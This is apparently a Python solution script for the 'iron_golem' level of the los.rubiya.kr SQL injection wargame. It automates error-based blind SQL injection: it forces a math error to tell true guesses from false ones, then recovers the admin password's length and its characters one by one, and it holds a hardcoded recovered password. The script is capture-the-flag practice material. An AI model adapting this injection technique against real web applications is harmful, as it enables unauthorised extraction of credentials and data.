import urllib.parse

from constants import *

chall_url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php"

no_error_text = "<hr>query : <strong>"

pw_len = None
prefix = ""


def find_char(prefix):
    for c in digits_and_lower_case_letters:
        pw_query = f"if(pw like '{prefix + c}%', True, power(pw,999))"
        res = make_request(chall_url, "?pw=" + urllib.parse.quote(f"' or id='admin' and {pw_query} -- -"))
        if res.startswith(no_error_text):
            print("Found prefix", prefix + c)
            return prefix + c
    print("did not find char")


pw_len = 32
prefix = "06b5a6c16e8830475f983cc3a825ee9a"

if pw_len is None:
    for i in range(40):
        pw_query = f"if(length(pw)={i}, True, power(pw,999))"
        res = make_request(chall_url, "?pw=" + urllib.parse.quote(f"' or id='admin' and {pw_query} -- -"))
        if res.startswith(no_error_text):
            print("Found pw length:", i)
            pw_len = i
            break
    assert pw_len

while len(prefix) < pw_len:
    prefix = find_char(prefix)
    assert prefix

res = make_request(chall_url, f"?pw={prefix}")
check_clear(res)
